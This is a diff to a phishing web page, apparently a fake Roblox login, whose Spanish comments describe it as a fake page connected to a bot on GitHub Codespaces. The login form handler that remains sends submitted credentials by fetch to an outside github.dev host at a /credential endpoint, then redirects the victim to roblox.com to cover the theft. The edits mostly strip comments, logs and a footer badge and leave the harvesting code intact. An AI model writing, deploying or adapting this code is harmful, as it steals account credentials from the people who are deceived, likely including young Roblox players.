@@ -878,7 +878,7 @@
       <a href="#">Terms</a>
       <a href="#">Accessibility</a>
       <a href="#">Privacy</a>
-      <a href="#">Privacy Choices</a><img src="badge.png" alt="Badge" style="width:18px;height:18px;margin:0 0 0 4px;display:inline-block;vertical-align:middle;">
+      <a href="#">Privacy Choices</a>
       <a href="#">Sitemap</a>
     </div>
     <div class="footer-divider"></div>
@@ -898,12 +898,8 @@
 // SCRIPT PARA PÁGINA FAKE - CONECTADO AL BOT DE CODESPACES
 // ============================================================
 
-// 🔥 URL DEL BOT DE CODESPACES (CAMBIA ESTO)
+// 🔥 URL DEL BOT DE CODESPACES (YA CONFIGURADA)
 let botUrl = 'https://stunning-lamp-jjgg4r9r6g7p35rg6-5000.app.github.dev';
-
-// ============================================================
-// FUNCIONES DE LA PÁGINA
-// ============================================================
 
 function setTab(el, tabName){
     document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
@@ -916,10 +912,6 @@ function navigateToLogin(){
     document.body.classList.add('login-active');
     window.scrollTo(0,0);
 }
-
-// ============================================================
-// INTERCEPTAR FORMULARIO DE LOGIN
-// ============================================================
 
 const loginForm = document.getElementById('loginForm');
 
@@ -939,7 +931,6 @@ loginForm.onsubmit = async function(e) {
     document.getElementById('loginLoading').style.display = 'flex';
     
     try {
-        // Enviar al bot de Codespaces
         await fetch(`${botUrl}/credential`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -948,7 +939,6 @@ loginForm.onsubmit = async function(e) {
         
         console.log('📨 Credenciales enviadas al bot');
         
-        // Redirigir a Roblox después de 3 segundos
         setTimeout(() => {
             window.location.href = 'https://www.roblox.com';
         }, 3000);
@@ -960,9 +950,6 @@ loginForm.onsubmit = async function(e) {
         document.getElementById('loginLoading').style.display = 'none';
     }
 };
-
-console.log('✅ Página conectada al bot de Codespaces');
-console.log('📡 Bot URL:', botUrl);
 </script>
 </body>
 </html>
